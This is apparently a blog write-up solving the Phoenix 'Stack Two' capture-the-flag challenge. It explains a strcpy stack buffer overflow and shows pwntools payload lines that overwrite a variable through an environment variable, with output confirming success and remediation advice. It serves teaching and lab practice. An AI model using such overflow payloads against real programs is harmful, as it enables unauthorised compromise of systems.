# :game_die: Phoenix Challenges - Stack Two. The Challenge

---

# Phoenix Challenges — Stack Two

## The Challenge

The challenge’s description and source code are located [here](http://exploit.education/phoenix/stack-two/). It and all other Phoenix binaries are located in the /opt/phoenix/amd64 directory. A previous post describes how to set up the Virtual Machine for these challenges, if that hasn’t been done already.

## The File

We use the following to inspect the *Stack Two* file’s properties.

```
nathan@nathan-VirtualBox:/opt/phoenix/amd64$ file stack-twostack-two: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped
```

We know that like the *Stack One* challenge, the *Stack Two* file has

- The setuid property. It indicates that the program is run with the privileges of the owner. If a file’s owner is root (and it isn’t in this case), it can be used to escalate privileges

- Symbols, as indicated by the not stripped attribute. This means that those debugging and analyzing the binary can see the original variables and function names

- Shared libraries that are dynamically linked as part of its execution. This can help identify standard functions used

- An ELF 64-bit LSB executable, x86–64. ELF is the file format, 64-bit is the word size, LSB means that it is little-endian (least significant bytes used first), and that the x86–64 instruction set is used.

*Spoiler Alert*: This is not a coincidence. *Stack Two* is very similar to the *Stack One *challenge, both in terms of the problem and solution.

## Objective

Looking at *Stack Two’s* C code, we see the changeme variable stored in the locals struct is initialized to 0. The goal is to tamper with its value and make it equal to 0x0d0a090a for the desired statement to be printed.

## Related Concepts

It is necessary to understand how Stack memory works. I wrote a lengthy explanation in the writeup for the Phoenix Stack Zero challenge, which one can read if interested.

It is also necessary to understand what *environment variables* are. They are variables inside a computer system’s execution environment that can configure/affect processes or programs that are currently ongoing or are about to be executed.

While most are familiar with them from their time working with Linux machines, they also exist in Windows. Below are some examples from Windows 10:¹

Let’s pivot over to Linux since this challenge runs on it. Linux environmental variables either have global or local scope:²³

- Global Environment Variables: They can be used by the current Linux terminal and any process, shell script, or program running within it. They are defined either in Linux configuration files or with the export <varname>=<value> terminal command.

- Local Environment Variables: They can *only* be used by the Linux terminal in which they are defined. Even if a process or program was launched in the terminal (in which they are defined), they cannot access it. They are defined with the <varname>=<value> terminal command

## The Bug

All of *Stack Two’s* data is stored on the stack, with the *locals* struct’s *buffer* and *changeme* variables being adjacent neighbors. Excess data rammed into the buffer will spill over into the *changeme* variable and affect its value. This spillover is caused by the strcpy() function, which writes text stored in the *ExploitEducation* environment variable into the *locals.buffer* without any bounds-checking.

## The Exploit

The *locals.buffer* into which the input is written has space for 64 characters. Since the *locals.changeme* variable was 0 originally, the exploit needs to tamper with its memory location to make it have the desired 0x0d0a090a value. This is done by feeding in an input string of 64 characters to completely occupy the buffer’s memory and appending additional data to ensure the *changeme* variable is completely overwritten with the 0x0d0a090a value.

## Get Nathan Pavlovsky’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

This exploit-crafting process will be quick; *Stack Two* is identical to the *Stack One* challenge in every way, except for the crafted payload being passed into the program through the *ExploitEducation* environment variable instead of a program argument. Those unfamiliar with [my solution to the Stack One challenge might want to review it for some historical context]

Time to craft the exploit. The payload in the exploit.py file’s line 14 was

```
payload = cyclic(64) + p32(0xdeadbeef)
```

It was passed into the execution of the stack-two program in the exploit.py file’s line 20 with

```
p = process(["stack-two"], env={ "ExploitEducation" : payload }, cwd="/opt/phoenix/amd64")
```

Notice the `env={"ExploitEducation":payload}`. When Pwntools creates a new terminal process for launching the stack-two binary, the env dictionary specifies the *ExploitEducation* environment variable’s value initialized upon its launch. Since the env dictionary has no other entries, no other environment variables are initialized. *ExploitEducation* is a global environment variable since the *stack-two* program uses it when executing.

Controlling environment variables’ values with the env={<data>} dictionary is important in the exploit development and stabilization process. This is because environmental variables are found in the stack’s bottom, with their lengths affecting the locations of function-specific stack data within available memory regions.

If there is no such env dictionary in Pwntools’ process-launching command, the initialized terminal process inherits the original executing environment’s environment variables.⁴ Many CTF developers use this fact to throw off players who forget to manually control the environment variables in the exploit-executing environment. The challenge-hosting machines are configured to have different environment variables initialized. Some are even built to have different environment variables initialized *each time* a new program is run. Crafting exploits attacking shifting memory locations is very difficult, if nigh impossible.

>

Pro Tip: Always control the values of a launched process’ environment variables with the env dictionary! If none are needed, initialize processes launched in Pwntools scripts with env={}

O.K. I created the basic exploit and passed it in through the *ExploitEducation* environment variable. The *stack-two* execution environment has a stable stack since I controlled the process environment variable’s length and value. The next step was to test whether the 0xdeadbeef completely overwrote the changeme variable with a conveniently-included printout:

```
nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-two$ ./exploit.py
Launching The Stack Two Exploit!
[!] Could not find executable 'stack-two' in $PATH, using '/opt/phoenix/amd64/stack-two' instead
[+] Starting local process '/opt/phoenix/amd64/stack-two': pid 5478
[*] Switching to interactive mode
[*] Process '/opt/phoenix/amd64/stack-two' stopped with exit code 0 (pid 5478)
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Almost! changeme is currently 0xdeadbeef, we want 0x0d0a090a
[*] Got EOF while reading in interactive
```

It did! The final step was to replace the payload’s 0xdeadbeef value with 0x0d0a090a — and lookie:

```
nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-two$ ./exploit.py
Launching The Stack Two Exploit!
[!] Could not find executable 'stack-two' in $PATH, using '/opt/phoenix/amd64/stack-two' instead
[+] Starting local process '/opt/phoenix/amd64/stack-two': pid 5485
[*] Switching to interactive mode
[*] Process '/opt/phoenix/amd64/stack-two' stopped with exit code 0 (pid 5485)
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
[*] Got EOF while reading in interactive
```

The exploit code can be found in my [Github repository](https://github.com/secnate/Exploit-Education-CTFs) for Phoenix challenge solutions.

## Remediation

To prevent such a memory corruption bug, I would urge developers to not write in C and to transition to memory-secure languages such as Python or Rust.

If there is no choice but to use C, I would caution against using the [strcpy](https://www.geeksforgeeks.org/why-strcpy-and-strncpy-are-not-safe-to-use/) function to extract inputs from anywhere. As just seen, it continues reading the input until the terminating NULL (‘\0’) is seen, regardless of the destination buffer’s size.

The [strlcpy](https://man.openbsd.org/strlcpy.3) function should be used instead. It writes the input into the destination buffer up to the specified size and terminates the buffer with the NULL (‘\0’) character.

The source code’s `strcpy(locals.buffer, ptr);` line would thus be

```
strlcpy(locals.buffer, ptr, 64);
```

---
